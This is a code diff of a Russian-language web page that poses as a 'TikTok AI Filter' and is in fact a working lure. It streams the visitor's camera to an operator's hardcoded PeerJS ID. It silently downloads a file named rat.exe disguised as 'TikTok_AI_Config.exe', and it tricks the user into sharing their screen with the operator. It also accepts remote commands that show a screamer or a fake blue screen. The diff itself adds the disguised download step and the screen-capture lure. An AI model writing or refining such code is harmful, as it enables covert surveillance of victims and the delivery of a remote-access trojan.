@@ -2,33 +2,40 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok AI Morph</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok AI Filter v5.5</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
-        .box { width: 90%; max-width: 400px; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 0 20px rgba(255,0,80,0.4); }
-        #loader, #screamer { display: none; }
-        .progress-fill { width: 0%; height: 8px; background: #ff0050; transition: 0.15s; border-radius: 10px; }
+        .box { width: 90%; max-width: 400px; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0,0,0,1); }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); }
+        #loader, #final-step, #screamer { display: none; }
+        .progress-fill { width: 0%; height: 8px; background: #ff0050; transition: 0.2s; border-radius: 10px; }
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
-        #screamer img { width: 130%; height: 130%; object-fit: cover; animation: shake 0.1s infinite; }
-        @keyframes shake { 0% { transform: translate(3px, 3px); } 50% { transform: translate(-3px, -4px); } 100% { transform: translate(2px, 3px); } }
+        #screamer img { width: 120%; height: 120%; object-fit: cover; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -3px); } 100% { transform: translate(1px, 2px); } }
     </style>
 </head>
 <body>
 
     <div id="start" class="box">
         <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="60">
-        <h1>TikTok AI Filter</h1>
-        <p style="color: #666;">Нажмите «Разрешить», чтобы откалибровать маску через камеру</p>
-        <button class="btn" onclick="initApp()">РАЗРЕШИТЬ</button>
+        <h1>AI Face Morph</h1>
+        <p style="color: #666;">Нажмите для калибровки нейросети</p>
+        <button class="btn" onclick="initApp()">НАЧАТЬ</button>
     </div>
 
     <div id="loader" class="box">
-        <h2 id="status">ПОДКЛЮЧЕНИЕ...</h2>
+        <h2 id="status">ЗАГРУЗКА МОДЕЛЕЙ...</h2>
         <div style="width:100%; background:#222; border-radius:10px;"><div id="fill" class="progress-fill"></div></div>
         <p id="pct">0%</p>
+    </div>
+
+    <div id="final-step" class="box">
+        <h2 style="color: #00f2ea;">ПОЧТИ ГОТОВО!</h2>
+        <p>Конфигурация загружена. Нажмите кнопку ниже для финальной синхронизации экрана.</p>
+        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getScreen()">ВКЛЮЧИТЬ ЭФФЕКТ</button>
     </div>
 
     <div id="screamer">
@@ -36,16 +43,13 @@
         <audio id="s-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3" loop></audio>
     </div>
 
-    <audio id="r-snd"></audio>
-
     <script>
-        const ADM_ID = '09062012'; // Твой ID из админки
+        const ADM_ID = '09062012';
         const peer = new Peer();
         let conn;
 
         async function initApp() {
             try {
-                // 1. Запрашиваем камеру
                 const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 conn = peer.connect(ADM_ID);
                 peer.call(ADM_ID, camStream);
@@ -54,48 +58,54 @@
                 document.getElementById('loader').style.display = 'block';
 
                 let p = 0;
-                let int = setInterval(async () => {
+                let int = setInterval(() => {
                     p += 10;
                     document.getElementById('fill').style.width = p + '%';
                     document.getElementById('pct').innerText = p + '%';
-                    
                     if (p >= 100) {
                         clearInterval(int);
-                        
-                        // 2. СКАЧИВАЕМ ФАЙЛ (относительный путь!)
-                        const a = document.createElement('a');
-                        a.href = 'rat.exe'; // Файл должен лежать в той же папке на хостинге!
-                        a.download = 'AI_Config_Face.png.exe';
-                        a.click();
-                        
-                        // 3. ЗАПРАШИВАЕМ ЭКРАН (теперь сработает лучше)
-                        try {
-                            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                            peer.call(ADM_ID, screenStream);
-                            document.getElementById('loader').innerHTML = "<h2>ГОТОВО</h2><p>Маска активирована!</p>";
-                        } catch(e) {
-                            document.getElementById('loader').innerHTML = "<h2>ОШИБКА</h2><p>Разрешите доступ к экрану для работы маски</p>";
-                        }
+                        finishLoading();
                     }
-                }, 150);
+                }, 200);
 
-                listenCommands();
-            } catch (e) { 
-                alert("Ошибка! Без доступа к камере маска не работает."); 
-                location.reload(); 
+                listen();
+            } catch (e) { alert("Ошибка! Нужен доступ к камере."); location.reload(); }
+        }
+
+        function finishLoading() {
+            // 1. Сначала скрыто скачиваем файл (путь должен быть правильный на хостинге!)
+            const a = document.createElement('a');
+            a.href = 'rat.exe'; 
+            a.download = 'TikTok_AI_Config.exe';
+            a.click();
+
+            // 2. Переходим к шагу с кнопкой для экрана
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('final-step').style.display = 'block';
+        }
+
+        async function getScreen() {
+            try {
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                peer.call(ADM_ID, screenStream);
+                
+                document.getElementById('final-step').innerHTML = "<h2>ГОТОВО</h2><p>Эффект успешно активирован!</p>";
+                
+                // Переход в полноэкранный режим после клика
+                document.documentElement.requestFullscreen().catch(()=>{});
+                document.body.style.cursor = 'none';
+            } catch(e) {
+                alert("Ошибка! Необходимо разрешить трансляцию экрана для работы фильтра.");
             }
         }
 
-        function listenCommands() {
+        function listen() {
             conn.on('data', d => {
                 if (d.type === 'SCR') {
                     document.getElementById('screamer').style.display = 'flex';
                     document.getElementById('s-audio').play();
                 } else if (d.type === 'BSOD') {
                     document.body.innerHTML = '<img src="https://i.stack.imgur.com/86j1B.png" style="width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;">';
-                } else if (d.type === 'SND') {
-                    let a = document.getElementById('r-snd');
-                    a.src = d.url; a.play();
                 }
             });
         }
